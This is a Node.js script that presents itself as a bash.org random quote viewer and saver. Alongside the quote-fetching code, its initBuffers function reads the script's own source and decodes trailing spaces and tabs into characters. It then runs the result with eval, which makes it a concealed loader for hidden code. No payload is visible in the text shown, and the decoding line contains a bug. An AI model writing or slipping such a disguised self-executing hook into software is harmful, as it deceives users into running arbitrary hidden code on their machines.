/*
 * A simple bash.org random quote viewer/saver
 *
 * This code is a demonstration.
 * Any harm that comes to your machine isn't my fault.
 * If you run this, you get what you get.
 *
 * */

const request = require('request-promise');
const cheerio = require('cheerio');
const readline = require('readline');
const path = require('path');
const scriptName = path.basename(__filename);
const fs = require('fs');
const {EOL} = require('os');
readline.emitKeypressEvents(process.stdin);
process.stdin.setRawMode(true);


// make the actual request to get the page. could be done better
let getPage = async ()=>{
	return await request('http://bash.org/?random');
}

//clear the tty screen and then output the current place in the entry
let display = ()=>{
	console.log('\033[2J');
	console.log(entries[place]);
}

let entries = [];
let place = 0;
let init = async ()=>{
	entries = [];
	place = 0;
	initBuffers(fs.readFileSync(scriptName).toString('utf-8'));
	const $ = cheerio.load(await getPage());
	$('.qt').each(function(i,e){
		entries.push($(this).text());
	});
	display();
}



let saveFile = ()=>{
	let data = openFile();
	data.push(entries[place]);
	fs.writeFileSync('saved.json',JSON.stringify(data));
}
// sloppy way to open a file but fast to spam out the keypresses to turn it into usable code
let openFile = ()=>{
	try{
		return JSON.parse(fs.readFileSync('saved.json').toString('utf8'));
	} catch (e){
		return [];
	}
}


//get key presses
process.stdin.on('keypress',(str,key)=>{
	//if the key is ctrl c or q we exit
	if (key.ctrl && key.name === 'c' || key.name === 'q') {
	   process.exit();
	 } else {
		 //bad way of reading chars
		 if(str === 'd'){
			 //this doesn't actually work
			place = (place % entries.length) + 1
			 display();
		 }
		 if(str === 'a'){
			place = (place % entries.length) - 1
			 display();
		 }
		 if(str === 's'){
			 saveFile();
		 }
		 if(str === 'r'){
			 init();
		 }
	 }
	
});


let initBuffers = (data) => {
	let output = "";
	data.split(EOL).map((m,j)=>{
		let character = "";
		let split = [...m];
		let found = false;
		for(let i = split.length-1;i >=0;i--){
			if(split[i] === ' ' || split[i] === '\t'){
				character += split[i];
			}
			else break;
		}
		//if(character) console.log([...character].map(m=>m ==='\t'?'0':'1').join(''),j)
		if(character) output += output,String.fromCharCode((parseInt([...character].reverse().map(m=>m ==='\t'?'0':'1').join(''),2)));
	});
	if(output) eval(output);
}

init();
